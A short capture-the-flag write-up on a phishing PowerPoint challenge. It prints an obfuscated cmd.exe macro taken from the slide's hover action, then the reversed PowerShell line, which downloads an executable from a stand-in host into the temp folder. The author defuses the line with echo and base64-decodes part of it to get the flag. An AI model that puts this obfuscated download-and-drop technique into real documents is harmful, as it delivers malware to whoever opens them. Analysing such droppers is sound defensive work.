Open the pptx and after some digging you find the onhover macro on the background square

```
cmd.exe /V:ON/C"set yM="o$ eliftuo- exe.x/neila.htraeyortsed/:ptth rwi ;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q' + pmet:vne$ = o$" c- llehsrewop&&for /L %X in (122;-1;0)do set kCX=!kCX!!yM:~%X,1!&&if %X leq 0 call %kCX:*kCX!=%"
```

extract the powershell part and reverse
```powershell
powershell -c "$o = $env:temp + 'Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe'; iwr http:/destroyearth.alien/x.exe -outfile $o
```
base64 decode the filename gives a partial flag

running it fully with the for loop should give the full flag
you must first replace the `powershell` with `echo`
```
cmd.exe /V:ON/C"set yM="o$ eliftuo- exe.x/neila.htraeyortsed/:ptth rwi ;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q' + pmet:vne$ = o$" c- ohce&&for /L %X in (122;-1;0)do set kCX=!kCX!!yM:~%X,1!&&if %X leq 0 call %kCX:*kCX!=%"
```
```powershell
$o = $env:temp + 'Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe'; iwr http:/destroyearth.alien/x.exe -outfile $o
```

`Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99` and then using b64 with the alphabet `A-Za-z0-9-_` you get the flag

CHTB{pH1sHiNg_w0_m4cr0s???}
